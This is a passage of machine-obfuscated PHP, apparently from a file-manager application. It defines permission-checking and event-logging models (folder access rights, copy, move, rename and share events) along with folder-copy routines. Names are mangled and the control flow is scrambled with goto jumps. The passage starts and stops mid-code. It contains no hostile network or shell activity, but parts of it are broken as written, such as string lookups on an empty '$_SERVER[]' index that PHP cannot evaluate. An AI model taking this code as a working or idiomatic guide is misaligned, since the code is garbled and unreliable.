$F볪[$dұ[396]] = 0; } $this->where($cŔЃ)->data($F볪)->save(); } $this->where(array($dұ[383] => $f뉎ۥ))->data($B܏)->save(); return $f뉎ۥ; goto dޣ; dޣ: } private function clearShare($fڠ, $AŊ߲) { goto f; B̰: if (!$cϒ) { return; } $dԆ͙ = array($C±[369] => array($C±[7], $cϒ), $C±[448] => 1); $f = Model($C±[536])->field($C±[441])->where($dԆ͙)->select(); goto aܜ剜; cĢӦ: if ($dɡۚ[$C±[456]] == $b[$C±[456]] && $dɡۚ[$C±[371]] == $C±[535]) { return; } $dԆ͙ = array($C±[459] => array($C±[483], $dɡۚ[$C±[459]] . $fڠ . $C±[484])); $cϒ = $this->field($C±[383])->where($dԆ͙)->getField($C±[369], !0); goto B̰; CӐ: Model($C±[536])->where($dԆ͙)->save(array($C±[448] => 0)); Model($C±[537])->where($dԆ͙)->delete(); goto aЃ; aܜ剜: if (!$f) { return; } $f = array_to_keyvalue($f, $C±[33], $C±[441]); $dԆ͙ = array($C±[441] => array($C±[7], $f)); goto CӐ; f: $C± =& $_SERVER[]; $dɡۚ = $this->sourceInfo($fڠ); $b = $this->sourceInfo($AŊ߲); goto cĢӦ; aЃ: } public function copyFolderFromIO($c׌, $A, $BР, $fފ, $cٹ, $Eˈ = false) { goto C; e͋΋: Model($FϞ暝[504])->addAll($c؜[$FϞ暝[502]], array(), !0); Model($FϞ暝[505])->eventCopy($A̜ģ); $this->saveAll($c؜[$FϞ暝[503]]); goto A; aܟ: Hook::trigger($FϞ暝[540]); if ($A̜ģ) { $this->folderSizeResetChildren($A̜ģ); } $this->_childrenListClear(); goto e͋΋; C: $FϞ暝 =& $_SERVER[]; $c؜ = array($FϞ暝[502] => array(), $FϞ暝[503] => array(), $FϞ暝[501] => array(), $FϞ暝[538] => array()); $c = $Eˈ ? $Eˈ : $c׌->getPathName($c׌->pathThis($A)); goto Aꍨ; A: Model($FϞ暝[422])->linkAdd($c؜[$FϞ暝[501]]); Model($FϞ暝[422])->remove($c؜[$FϞ暝[538]]); $this->folderSizeReset($BР); goto D; f׆ޙ: if ($b) { $this->_childrenAllMake($b); } Hook::trigger($FϞ暝[539]); $this->_copyChildTo($c׌, $A, $A̜ģ, $fފ, $c؜, $cٹ); goto aܟ; D: $this->updateModifyTime($BР); return $A̜ģ; goto eͫڗ; Aꍨ: $b = $this->fileNameExist($BР, $c); $A̜ģ = $this->mkdir($BР, $c, $fފ); if (!$b || $fފ == REPEAT_RENAME_FOLDER) { $fފ = !1; } goto f׆ޙ; eͫڗ: } private function _copyChildTo($Cǌ, $A뗎, $c҃, $Eڐ, &$D, $E޷Ռ) { goto bƜ; eǫ: $dӥ푟 = $this->_childrenList($c҃); $dӥ푟 = array_to_keyvalue($dӥ푟, $eۃߎ[28]); foreach ($aǻ as $E) { $eԣӞ = $dӥ푟[$E[$eۃߎ[28]]]; $dΜ = $eԣӞ[$eۃߎ[369]]; $this->_copyApplyMeta($eԣӞ, $D); if ($E[$eۃߎ[29]] == $eۃߎ[76]) { $E[$eۃߎ[75]] = $Cǌ->getPathInner($E[$eۃߎ[75]]); $this->_copyChildTo($Cǌ, $E[$eۃߎ[75]], $dΜ, $Eڐ, $D, $E޷Ռ); } } goto cε޾; Cƴ: $aǻ = array_merge($B[$eۃߎ[73]], $B[$eۃߎ[74]]); $Aן͉ = $this->_addFiles($Cǌ, $B[$eۃߎ[73]], $E޷Ռ); $eٯ޴ = array(); goto aѡ; aѡ: foreach ($aǻ as &$E) { goto eա; bʸ: if ($Eڐ) { $c҈ = $this->fileNameExistCache($c҃, $E[$eۃߎ[28]]); if ($c҈) { if ($E[$eۃߎ[370]] || $Eڐ == REPEAT_SKIP) { continue; } if ($Eڐ == REPEAT_REPLACE) { $eԣӞ = $this->sourceInfoCache($c҈); $b، = $this->fileHistory($eԣӞ, $E[$eۃߎ[419]], $E[$eۃߎ[77]]); if ($b،) { $D[$eۃߎ[501]][] = $E[$eۃߎ[419]]; } continue; } else { if ($Eڐ == REPEAT_RENAME) { $E[$eۃߎ[28]] = $this->fileNameAutoCache($c҃, $E[$eۃߎ[28]], $Eڐ, !1); } } } } if (!$E[$eۃߎ[370]] && $E[$eۃߎ[419]]) { $D[$eۃߎ[501]][] = $E[$eۃߎ[419]]; } $eٯ޴[] = $this->_makeItemData($E, $D񐓇ߚ, $E[$eۃߎ[28]]); goto d; eա: if (isset($Aן͉[$E[$eۃߎ[28]]])) { $E = $Aן͉[$E[$eۃߎ[28]]]; } $E[$eۃߎ[370]] = $E[$eۃߎ[29]] == $eۃߎ[76]; $E[$eۃߎ[372]] = _get($E, $eۃߎ[160], $eۃߎ[33]); goto eﴄ޸; eﴄ޸: $E[$eۃߎ[77]] = _get($E, $eۃߎ[77], 0); $E[$eۃߎ[419]] = _get($E, $eۃߎ[419], 0); if (!isset($E[$eۃߎ[541]]) && $E[$eۃߎ[419]]) { $D[$eۃߎ[538]][] = $E[$eۃߎ[419]]; } goto bʸ; d: } unset($E); if (!empty($eٯ޴)) { $this->addAll($eٯ޴); } goto eǫ; bƜ: $eۃߎ =& $_SERVER[]; $D񐓇ߚ = $this->sourceInfoCache($c҃); $B = $Cǌ->listPath($A뗎, !1, !0); goto Cƴ; cε޾: } private function _addFiles($C쥛, $e݆, $Fé޴) { goto BĤֺ; Dӑ莣: return $Aԧ; goto e; A҂: foreach ($a as $eɊ) { if (!isset($e[$eɊ[$D[163]]])) { continue; } $E唆 =& $e[$eɊ[$D[163]]]; foreach ($E唆 as &$e) { $e[$D[419]] = $eɊ[$D[419]]; } unset($e); } $Aԧ = array(); foreach ($e݆ as $c) { $Aԧ[$c[$D[28]]] = $c; } goto Dӑ莣; E: foreach ($e݆ as &$e) { goto Cِ; Eʊĉ: if (count($e[$cڲ]) > 1) { $e[$D[541]] = !0; } goto a; b螼: $cڲ = $C쥛->hashMd5($e[$D[75]]); if (strlen($cڲ) > 10 && !isset($e[$cڲ])) { $e[$cڲ] = array(); } $e[$D[164]] = $Dϐ; goto dުʲ; dުʲ: $e[$D[163]] = $cڲ; Hook::trigger($D[543], $e); $e[$cڲ][] =& $e; goto Eʊĉ; Cِ: Hook::trigger($D[542], $e); $e[$D[75]] = $C쥛->getPathInner($e[$D[75]]); $Dϐ = $C쥛->hashSimple($e[$D[75]]); goto b螼; a: } $Cъ = array($D[163] => array($D[7], array_keys($e))); $A = Model($D[544]); goto c; c: $a = $A->where($Cъ)->select(); $a = $a ? $a : array(); foreach ($a as $eɊ) { if (!isset($e[$eɊ[$D[163]]])) { continue; } $C = $e[$eɊ[$D[163]]]; foreach ($C as &$e) { $e[$D[419]] = $eɊ[$D[419]]; $e[$D[541]] = !0; } unset($e); } goto e; C: $Cъ = array($D[163] => array($D[7], array_keys($e))); $a = $A->where($Cъ)->select(); $a = $a ? $a : array(); goto A҂; e: $A㦪ަ = array(); foreach ($e݆ as $eֶϺ) { if (isset($eֶϺ[$D[541]]) && $eֶϺ[$D[541]]) { continue; } $eǘ = $C쥛->getPathInner($eֶϺ[$D[75]]); $aӃ = $A->addFileMake($eǘ, $eֶϺ[$D[77]], $eֶϺ[$D[164]], $eֶϺ[$D[163]], $eֶϺ[$D[28]], $Fé޴); $A㦪ަ[] = $aӃ; } $A->addAll($A㦪ަ); goto C; BĤֺ: $D =& $_SERVER[]; if (!$e݆ || count($e݆) == 0) { return array(); } $e = array(); goto E; e: } } define($_SERVER[][545], $_SERVER[][546]); goto Dƌ; eɊ: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\162\x63\145\x5f\141\165\x74\150"; public function getAuth($Cۆ) { goto aܼ; FД: return $eƄ; goto C۬; aܼ: $d =& $_SERVER[]; $D = $d[2270]; $eҘ = array($d[369] => $Cۆ); goto C; C: $Cƛ = $this->field($D)->order($d[367])->where($eҘ)->select(); $eƄ = array(); foreach ($Cƛ as $Dك) { if (Model($d[2271])->listData($Dك[$d[2252]])) { $eƄ[] = $Dك; } } goto FД; C۬: } public function setAuth($Eͣ, $bׯƯ) { goto f; bة⏃: $this->where(array($D[383] => $Eͣ))->delete(); $this->addAll($aϲ); return !0; goto b؂; Bɿ: $a֍ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $aϲ = array(); foreach ($bׯƯ as $Fɋʍ) { if (!in_array($Fɋʍ[$D[371]], $a֍)) { show_json(LNG($D[2272]), !1); } if ($E != $aב) { if ($Fɋʍ[$D[371]] == SourceModel::TYPE_GROUP) { } if ($Fɋʍ[$D[456]] != 0 && !in_array($Fɋʍ[$D[456]], $c)) { } } if ($Fɋʍ[$D[456]] == 0) { $Fɋʍ[$D[371]] = SourceModel::TYPE_USER; } $aϲ[] = array($D[369] => $Eͣ, $D[371] => intval($Fɋʍ[$D[371]]), $D[456] => intval($Fɋʍ[$D[456]]), $D[2252] => intval($Fɋʍ[$D[2252]]) ? intval($Fɋʍ[$D[2252]]) : 0, $D[2253] => intval($Fɋʍ[$D[2253]]) ? intval($Fɋʍ[$D[2253]]) : -1); } goto bة⏃; f: $D =& $_SERVER[]; $FƂա = Model($D[1133])->sourceInfo($Eͣ); if ($FƂա[$D[371]] != SourceModel::TYPE_GROUP) { return !1; } goto b; b: $aב = 1; $E = $FƂա[$D[456]]; if ($E != $aב) { $b󓨏 = array($D[2121] => $E); $c = Model($D[2197])->field($D[1453])->where($b󓨏)->select(); $c = array_to_keyvalue($c, $D[33], $D[1453]); } goto Bɿ; b؂: } public function authClear($a) { $fכ =& $_SERVER[]; $bǜΎҶ = Model($fכ[1133])->sourceInfo($a); $eʫ = array($a); if ($bǜΎҶ[$fכ[370]] == $fכ[83]) { $bԱǍ = array($fכ[525] => array($fכ[483], $bǜΎҶ[$fכ[459]] . $a . $fכ[484])); $eʫ = Model($fכ[1133])->field($fכ[383])->where($bԱǍ)->getField($fכ[369], !0); $eʫ[] = $a; } $this->where(array($fכ[383] => array($fכ[384], $eʫ)))->delete(); return !0; } public function get($eЯ) { $Aڤδ = $this->getSourceList(array($eЯ), !0); return $Aڤδ[0]; } public function getSourceList($b쾙ӑ, $fۧ = false) { goto Cև; D: $aÆ = array($F郲[383] => array($F郲[384], $Fۧ)); $Fޅ = $this->field($d)->where($aÆ)->select(); $Fޅ = array_to_keyvalue_group($Fޅ, $F郲[369]); goto Cޙ; dô: $Fۧ = array_values(array_unique($Fۧ)); if (!$Fۧ) { return array(); } $d = $F郲[2274]; goto D; Cޙ: $a = array(); foreach ($fۧ as $b鯫 => $fȿϻ) { $a[$b鯫] = $this->makeSourceAuth($fȿϻ, $Fޅ); } return $a; goto c; Cև: $F郲 =& $_SERVER[]; if (!$b쾙ӑ) { return array(); } $bĖ = Model($F郲[1133]); goto eߚ; eߚ: if (!$fۧ) { $aÆ = array($F郲[383] => array($F郲[384], $b쾙ӑ)); $fۧ = $bĖ->field($F郲[2273])->where($aÆ)->select(); $fۧ = array_to_keyvalue($fۧ, $F郲[369]); } $Fۧ = $b쾙ӑ; foreach ($fۧ as $fÐ => $Fș窄) { $bԐ = $bĖ->parentLevelArray($Fș窄[$F郲[459]]); $Fۧ = array_merge($Fۧ, $bԐ, array($fÐ)); } goto dô; c: } public function authDeepCheck($fٍĹ) { goto Bى; CΖƃ: $Fߦ = $C՚ ? $C՚[0] : $fٍĹ; return array($b敺[377] => -1, $b敺[418] => array($b敺[385] => $b敺[1046], $b敺[2127] => $b敺[468], $b敺[386] => LNG($b敺[2277]), $b敺[2139] => $b敺[2278]), $b敺[2279] => array($b敺[388] => $b敺[2280], $b敺[75] => $Fߦ)); goto Cȅ; Bى: $b敺 =& $_SERVER[]; if (_get($GLOBALS, $b敺[457])) { return !1; } $f = $this->makeAuthDeep(); goto e榡; e榡: if (!in_array($fٍĹ, $f[$b敺[2275]])) { return !1; } $C՚ = array(); foreach ($f[$b敺[2276]] as $Cۗ => $EĽ) { if (!in_array($fٍĹ, $EĽ)) { continue; } $C՚[] = $Cۗ; } goto CΖƃ; Cȅ: } protected function makeAuthDeep() { goto D˩߅; C: $E = Model($c׆ޫ[2281])->listData(); $d = array(); foreach ($E as $b) { if ($b[$c׆ޫ[376]] == 0 && $b[$c׆ޫ[2141]] == $c׆ޫ[83]) { $d[] = $b[$c׆ޫ[367]]; } } goto aө; dʲ: foreach ($cǉ as $Cތǻ => $D߲) { $c׶ה = $DȆσ[$Cތǻ]; if (!$c׶ה || !$Bލ[$c׶ה]) { continue; } $dĸ = array(); foreach ($Fƈ[$c׶ה] as $cઽ) { $dĸ[] = $Bލ[$cઽ]; } $cǉ[$Cތǻ] = array_merge($dĸ, $D߲); } $c޳Ɏ = array_values(array_unique($c޳Ɏ)); $AҬ = array($c׆ޫ[2275] => $c޳Ɏ, $c׆ޫ[2276] => $cǉ); goto Dӭ; b: foreach ($A̾ȉ as $cઽ) { $B = $Fܒ->getInfo($cઽ); $d = $Aլ->parentLevelArray($B[$c׆ޫ[459]]); $b֮ = array_merge($b֮, $d); } $b֮ = array_values(array_unique($b֮)); foreach ($b֮ as $cઽ) { $B = $Fܒ->getInfo($cઽ); $c޳Ɏ[] = $B[$c׆ޫ[391]][$c׆ޫ[369]]; $Bލ[$cઽ] = $B[$c׆ޫ[391]][$c׆ޫ[369]]; $Fƈ[$cઽ] = $Aլ->parentLevelArray($B[$c׆ޫ[459]]); } goto dʲ; D̐: $D秝 = array_to_keyvalue($DǶ, $c׆ޫ[33], $c׆ޫ[369]); $c޳Ɏ = array(); $b֮ = $d۟; goto bã; D˩߅: $c׆ޫ =& $_SERVER[]; static $AҬ = false; if ($AҬ) { return $AҬ; } goto C; Bׇ: $DȆσ = array(); $Bލ = array(); $Fƈ = array(); goto fĘ; aө: $d۟ = Session::get($c׆ޫ[2236]); $d۟ = array_to_keyvalue($d۟, $c׆ޫ[33], $c׆ޫ[2121]); $fȒ = array($c׆ޫ[371] => SourceModel::TYPE_USER, $c׆ޫ[456] => USER_ID); goto Cˊ; Dӭ: return $AҬ; goto a; fĘ: if ($D秝) { $f = $Aլ->where(array($c׆ޫ[369] => array($c׆ޫ[384], $D秝)))->select(); foreach ($f as $D) { $d = $Aլ->parentLevelArray($D[$c׆ޫ[459]]); $c޳Ɏ = array_merge($c޳Ɏ, $d); $b֮[] = $D[$c׆ޫ[456]]; $cǉ[$D[$c׆ޫ[369]]] = $d; $DȆσ[$D[$c׆ޫ[369]]] = $D[$c׆ޫ[456]]; } } $b֮ = array_values(array_unique($b֮)); $A̾ȉ = $b֮; goto b; bã: $Aլ = Model($c׆ޫ[1133]); $Fܒ = Model($c׆ޫ[458]); $cǉ = array(); goto Bׇ; Cˊ: if ($d۟) { $fȒ = array(array($c׆ޫ[371] => SourceModel::TYPE_USER, $c׆ޫ[456] => USER_ID), array($c׆ޫ[371] => SourceModel::TYPE_GROUP, $c׆ޫ[456] => array($c׆ޫ[384], $d۟)), $c׆ޫ[929] => $c׆ޫ[2203]); } if ($d) { $fȒ = array($fȒ, $c׆ޫ[2252] => array($c׆ޫ[2282], $d)); } $DǶ = $this->field($c׆ޫ[2283])->where($fȒ)->select(); goto D̐; a: } private function makeSourceAuth($Eì, $fǢ) { goto e򖙫; cų: $EąҤ = $Eì[$d[456]]; $C޺Գ = $Eì[$d[371]] == SourceModel::TYPE_GROUP; if ($C޺Գ && isset($bц[$EąҤ]) && !_get($GLOBALS, $d[457])) { $DØ׋ = $bц[$EąҤ]; if (Model($d[2271])->authCheckRoot($DØ׋[$d[376]][$d[376]])) { $B = Model($d[458])->getInfo($EąҤ); $a΂ = array($d[2284] => intval($DØ׋[$d[376]][$d[376]]), $d[2285] => $DØ׋[$d[376]], $d[2279] => array($d[388] => $d[2286], $d[2287] => $B[$d[391]][$d[369]], $d[2288] => $B[$d[463]])); return $a΂; } } goto BŴ; BŴ: $a΂ = !1; foreach ($E£ as $fĴ) { if (!isset($fǢ[$fĴ])) { continue; } $bⷿ = $this->authMake($fǢ[$fĴ]); if ($bⷿ[$d[418]]) { $a΂ = $bⷿ; break; } } if (!$C޺Գ) { return $a΂; } goto a; A蚭: return $a΂; goto dչܤ; e򖙫: $d =& $_SERVER[]; $bц = Session::get($d[2236]); $bц = array_to_keyvalue($bц, $d[2121]); goto dÓ; dÓ: $FҺ놧 = $d[83]; $E£ = Model($d[1133])->parentLevelArray($Eì[$d[459]]); $E£ = array_merge(array($Eì[$d[369]]), array_reverse($E£)); goto cų; a: if (!$a΂ && isset($bц[$EąҤ])) { $DØ׋ = $bц[$EąҤ]; $B = Model($d[458])->getInfo($EąҤ); $a΂ = array($d[2284] => intval($DØ׋[$d[376]][$d[376]]), $d[2285] => $DØ׋[$d[376]], $d[2279] => array($d[388] => $d[2289], $d[75] => $B[$d[391]][$d[369]], $d[2288] => $B[$d[463]])); } if (!$a΂) { $B = Model($d[458])->getInfo($EąҤ); $dȄ = explode($d[47], trim($B[$d[459]], $d[47])); foreach ($dȄ as $Dю񫋶) { if ($Dю񫋶 == $d[468] || $Dю񫋶 == $FҺ놧) { continue; } if (!isset($bц[$Dю񫋶])) { continue; } $DØ׋ = $bц[$Dю񫋶]; $a΂ = array($d[2284] => intval($DØ׋[$d[376]][$d[376]]), $d[2285] => $DØ׋[$d[376]], $d[2279] => array($d[388] => $d[2286], $d[2287] => $B[$d[391]][$d[369]], $d[2288] => $B[$d[463]])); break; } } if (!$a΂ || $a΂[$d[377]] <= 0) { $a = $this->authDeepCheck($Eì[$d[369]]); if ($a) { $a΂ = $a; } } goto A蚭; dչܤ: } public function authOwnerApply($dηތ) { goto d; F: if (count($Aʧ) == 0) { $Aʧ = $this->authFolderOwnerGroup($dηތ[$d뵯[456]]); } $Aʧ = array_unique($Aʧ); if (AuthModel::authCheckRoot($dηތ[$d뵯[376]][$d뵯[377]])) { $Aʧ[] = USER_ID; } goto B̦埅; f蛎: $D = Model($d뵯[1133])->parentLevelArray($dηތ[$d뵯[459]]); $D = array_merge(array($dηތ[$d뵯[369]]), array_reverse($D)); $c = $d뵯[2274]; goto e; d: $d뵯 =& $_SERVER[]; if (empty($dηތ[$d뵯[376]]) || isset($dηތ[$d뵯[2290]]) && $dηތ[$d뵯[2290]]) { return $dηތ; } if (AuthModel::authCheckRoot($dηތ[$d뵯[376]][$d뵯[377]])) { return $dηތ; } goto f蛎; B̦埅: $dηތ[$d뵯[376]][$d뵯[2292]] = Model($d뵯[474])->userListInfo($Aʧ); return $dηތ; goto B; e: $Cі = array($d뵯[383] => array($d뵯[384], $D)); $fƞӗ = $this->field($c)->where($Cі)->select(); $fƞӗ = array_to_keyvalue_group($fƞӗ, $d뵯[369]); goto f; f: $F = array(); $Aʧ = array(); foreach ($fƞӗ as $d => $b) { $BѺ = $this->authFolderOwnerUser($b); $F[$d] = $BѺ; $Aʧ = array_merge($Aʧ, $BѺ[$d뵯[535]]); if ($BѺ[$d뵯[2291]]) { break; } } goto F; B: } private function authFolderOwnerGroup($Eؿ) { $Aˊ =& $_SERVER[]; $C = Model($Aˊ[2197])->where(array($Aˊ[2121] => $Eؿ))->select(); $Aϳ = array(); if (!$C) { return $Aϳ; } foreach ($C as $fȻɑ) { $D = $this->authInfo($fȻɑ); if (AuthModel::authCheckRoot($D[$Aˊ[376]])) { $Aϳ[] = $fȻɑ[$Aˊ[1453]]; } } return $Aϳ; } private function authFolderOwnerUser($B潖) { $B =& $_SERVER[]; $Eɣ = array(); $bʐ = !1; foreach ($B潖 as $e) { $Bِ = $this->authInfo($e); if ($e[$B[456]] == $B[468]) { $bʐ = !0; } if ($e[$B[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Bِ[$B[376]])) { $Eɣ[] = $e[$B[456]]; } } } return array($B[535] => $Eɣ, $B[2291] => $bʐ); } public function authMake($eை) { goto F; A: $d̠ = 0; $B = 0; $d = 0; goto dՋ; dՋ: $E챏 = 0; $D܈ = 0; $eǭ = 0; goto CȄ; F: $D۳ =& $_SERVER[]; if (!$eை) { return array($D۳[377] => 0, $D۳[418] => !1); } $F = Session::get($D۳[2236]); goto eÊׇ; b: $F = $D܈ ? $bޤ : ($eǭ ? $d⃒߼ : $d̠); $f艝Ą = $D܈ ? $B : ($eǭ ? $d : $E챏); $A̺Ĉ = $D܈ ? $D۳[2293] : ($eǭ ? $D۳[2294] : ($f濕 ? $D۳[2295] : $D۳[361])); goto c; eÊׇ: $C׈Ⱥ = array_to_keyvalue($F, $D۳[33], $D۳[2121]); $bޤ = 0; $d⃒߼ = 0; goto A; c: $dňЭ = array($D۳[2284] => intval($F), $D۳[2285] => $f艝Ą, $D۳[2279] => array($D۳[388] => $A̺Ĉ, $D۳[75] => $A蒳[$D۳[369]])); return $dňЭ; goto E; CȄ: $f濕 = 0; $A蒳 = array($D۳[369] => 0); foreach ($eை as $A蒳) { $f艝Ą = $this->authInfo($A蒳); $eט = $A蒳[$D۳[456]]; $A = intval($f艝Ą[$D۳[376]]); if ($A蒳[$D۳[371]] == SourceModel::TYPE_USER && $eט == USER_ID) { $D܈ = !0; $B = $f艝Ą; $bޤ = $A; } else { if ($A蒳[$D۳[371]] == SourceModel::TYPE_GROUP && in_array($eט, $C׈Ⱥ)) { $eǭ = !0; if ($A >= $d⃒߼) { $d⃒߼ = $A; $d = $f艝Ą; } } else { if ($eט == $D۳[468]) { $f濕 = !0; $E챏 = $f艝Ą; $d̠ = $A; } } } } goto b; E: } public function authTargetInfoMake($d) { goto a; c: foreach ($d as $c) { if ($c[$D޺[371]] == SourceModel::TYPE_USER) { $A݇[] = intval($c[$D޺[456]]); } else { if ($c[$D޺[371]] == SourceModel::TYPE_GROUP) { $c͎[] = intval($c[$D޺[456]]); } } } if ($A݇) { $A݇ = Model($D޺[474])->userListInfo($A݇); } if ($c͎) { $bկꌄ = array($D޺[2195] => array($D޺[384], $c͎)); $c͎ = Model($D޺[458])->field($D޺[2208])->where($bկꌄ)->select(); $c͎ = array_to_keyvalue($c͎, $D޺[2121]); } goto CǺ; a: $D޺ =& $_SERVER[]; $A݇ = array(); $c͎ = array(); goto c; CǺ: return array($D޺[2296] => $A݇, $D޺[2288] => $c͎); goto fאǇ; fאǇ: } private function authInfo($d݆Ϯ) { $e؇ =& $_SERVER[]; if ($d݆Ϯ[$e؇[2252]]) { $B = Model($e؇[2271])->listData($d݆Ϯ[$e؇[2252]]); if (!$B) { return !1; $A˪ = Model($e؇[2271])->listData(); $D = array_filter_by_field($A˪, $e؇[376], $e؇[468]); return $D; } $eՙɅ = array_field_key($B, array($e؇[367], $e؇[28], $e؇[376], $e؇[2139], $e؇[2142])); $eՙɅ[$e؇[2297]] = $d݆Ϯ; return $eՙɅ; } else { return array($e؇[385] => 0, $e؇[2127] => $d݆Ϯ[$e؇[2253]], $e؇[386] => $e؇[33], $e؇[2139] => $e؇[2298]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\143\x65\137\x65\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\151\x6d\x65", "\x74\151\x6d\x65", "\x69\x6e\163\145\x72\x74", "\146\165\x6e\x63\164\x69\x6f\x6e"), array("\x64\x65\x73\x63", '', "\151\156\x73\145\162\x74\54\x75\160\x64\x61\164\x65\54\163\x65\x6c\145\x63\164", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Eȍ, $D, $b擄 = '') { goto DΞ; e¯ݚ: if (!$DǮև) { return !1; } if ($this->isCacheEvent($DǮև, $D)) { return; } if ($b擄 && is_string($b擄)) { $b擄 = array($d[2151] => $b擄); } goto AߌƆ; DΞ: $d =& $_SERVER[]; if (!$this->eventSave) { return; } $DǮև = Model($d[1133])->sourceInfo($Eȍ); goto e¯ݚ; AߌƆ: $dث = array($d[383] => $Eȍ, $d[2299] => $DǮև[$d[461]], $d[2300] => $DǮև[$d[28]], $d[466] => $DǮև[$d[466]], $d[1444] => USER_ID, $d[388] => $D, $d[1446] => $b擄); $this->addSystemLog($D, $dث); return $this->add($dث); goto e; e: } private function addSystemLog($d玱, $b奭) { $Aׂ =& $_SERVER[]; if ($d玱 == $Aׂ[2301]) { $d玱 = $b奭[$Aׂ[405]][$Aׂ[2302]]; } else { if (in_array($d玱, array($Aׂ[2098], $Aׂ[2303]))) { $d玱 = $b奭[$Aׂ[405]][$Aׂ[711]]; } } $e͞ = array_merge($b奭, array($Aׂ[2304] => $b奭[$Aׂ[369]], $Aׂ[2305] => $b奭[$Aׂ[2305]])); Model($Aׂ[2061])->addLog($Aׂ[2306] . $d玱, $e͞); } private function isCacheEvent($Cݯ싸, $BЫ) { if ($Cݯ싸[$_SERVER[][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($F˭Ӑ, $B) { $e˼® =& $_SERVER[]; $f˿ = Model($e˼®[1133])->sourceInfo($F˭Ӑ); $d = array($e˼®[2302] => $B, $e˼®[28] => $f˿[$e˼®[28]]); return $this->addEvent($F˭Ӑ, $e˼®[2301], $d); } public function eventFileEdit($eĿ) { $E󺭣 =& $_SERVER[]; $b݇ = array($E󺭣[2307] => $_SERVER[$E󺭣[2308]], $E󺭣[1767] => strtolower(ACTION)); return $this->addEvent($eĿ, $E󺭣[2088], $b݇); } public function eventRecycle($FĈ, $Eܟ롅) { return $this->addEvent($FĈ, $_SERVER[][2303], $Eܟ롅); } public function eventRemove($f) { $D̉ =& $_SERVER[]; $FѠ = Model($D̉[1133])->sourceInfo($f); $cͻچ = $FѠ[$D̉[28]]; return $this->addEvent($FѠ[$D̉[461]], $D̉[2087], $cͻچ); } public function eventShare($A贋΂ٯ, $bۮ) { return $this->addEvent($A贋΂ٯ, $_SERVER[][2098], $bۮ); } public function eventMove($CΣ, $Dխ, $eЮ) { goto F¬; F¬: $dփÈŵ =& $_SERVER[]; $b = Model($dփÈŵ[1133]); $EĊ = $b->sourceInfo($CΣ); goto Fї; Dਚĳ: $this->addEvent($Dխ, $dփÈŵ[2313], $A男); goto dа; Fї: $c = $b->sourceInfo($Dխ); $C£ = $b->sourceInfo($eЮ); $A男 = array($dփÈŵ[1022] => $Dխ, $dփÈŵ[2309] => $c[$dփÈŵ[28]], $dփÈŵ[2310] => $c[$dփÈŵ[466]], $dփÈŵ[1023] => $eЮ, $dփÈŵ[2311] => $C£[$dփÈŵ[28]], $dփÈŵ[2312] => $C£[$dփÈŵ[466]]); goto cу; cу: $this->addEvent($CΣ, $dփÈŵ[492], $A男); $EĊ = $b->sourceInfo($CΣ); $A男 = array($dփÈŵ[369] => $EĊ[$dփÈŵ[369]], $dփÈŵ[28] => $EĊ[$dփÈŵ[28]]); goto Dਚĳ; dа: } public function eventCopy($F) { $this->eventCreate($F, $_SERVER[][490]); } public function eventRename($bϔï, $eೊ, $Aɢ) { $E =& $_SERVER[]; $A = array($E[1022] => $eೊ, $E[1023] => $Aɢ); return $this->addEvent($bϔï, $E[1146], $A); } public function eventAddComment($eڮ, $cԯ) { return $this->addEvent($eڮ, $_SERVER[][2314], $cԯ); } public function eventAddDesc($Fغ, $fʱȃ) { return $this->addEvent($Fغ, $_SERVER[][2315], $fʱȃ); } public function listBySource($B׭) { goto d; d: $FõԂڅ =& $_SERVER[]; $F = Model($FõԂڅ[1133])->sourceInfo($B׭); $fũ = array($FõԂڅ[383] => $B׭); goto fҎѴ; fҎѴ: if ($F[$FõԂڅ[370]] == $FõԂڅ[83]) { $c = Model($FõԂڅ[1133])->listSearchChildren($B׭, 20000); $c[] = $B׭ . $FõԂڅ[361]; $fũ = array($FõԂڅ[369] => array($FõԂڅ[7], $c)); } $Fʪ֛ = $this->where($fũ)->order($FõԂڅ[2316])->selectPage(); if ($Fʪ֛[$FõԂڅ[351]][$FõԂڅ[352]] == 0) { $Fʪ֛[$FõԂڅ[351]][$FõԂڅ[352]] = 1; $Fʪ֛[$FõԂڅ[354]] = array(array($FõԂڅ[383] => $B׭, $FõԂڅ[2299] => $F[$FõԂڅ[461]], $FõԂڅ[1444] => $F[$FõԂڅ[378]], $FõԂڅ[388] => $FõԂڅ[2317], $FõԂڅ[389] => $F[$FõԂڅ[187]], $FõԂڅ[1446] => $FõԂڅ[33])); } goto E; E: return $this->eventListParse($Fʪ֛, $B׭); goto f׌͙͊; f׌͙͊: } private function eventListParse($aӠ, $c糞ش) { goto Dԭŷ; Dԭŷ: $e砎 =& $_SERVER[]; $E = $aӠ[$e砎[354]]; $E = array_to_keyvalue($E, $e砎[33], $e砎[369]); goto c; eǌܡ: $dڊ = Model($e砎[772])->sourceListInfo($E, !0); foreach ($E as &$eıｌ) { if ($eıｌ[$e砎[29]] == $e砎[492] && isset($eıｌ[$e砎[405]][$e砎[1022]])) { $eıｌ[$e砎[405]][$e砎[1022]] = $dڊ[$eıｌ[$e砎[405]][$e砎[1022]]]; $eıｌ[$e砎[405]][$e砎[1023]] = $dڊ[$eıｌ[$e砎[405]][$e砎[1023]]]; } if ($eıｌ[$e砎[29]] == $e砎[2313] && isset($eıｌ[$e砎[405]][$e砎[369]])) { $eıｌ[$e砎[405]][$e砎[369]] = $dڊ[$eıｌ[$e砎[405]][$e砎[369]]]; } $eıｌ[$e砎[391]] = $dڊ[$eıｌ[$e砎[369]]]; $eıｌ[$e砎[2318]] = $dڊ[$eıｌ[$e砎[2305]]]; if ($eıｌ[$e砎[29]] == $e砎[2087]) { $eıｌ[$e砎[2318]] = $eıｌ[$e砎[391]]; $eıｌ[$e砎[2305]] = $eıｌ[$e砎[2318]][$e砎[369]]; $eıｌ[$e砎[391]] = !1; $eıｌ[$e砎[369]] = $e砎[33]; } $eıｌ[$e砎[2261]] = $Bֹ[$eıｌ[$e砎[1453]]]; } $aӠ[$e砎[354]] = $E; goto Dݪ瘛; Eܑ: $E = array_unique($E); 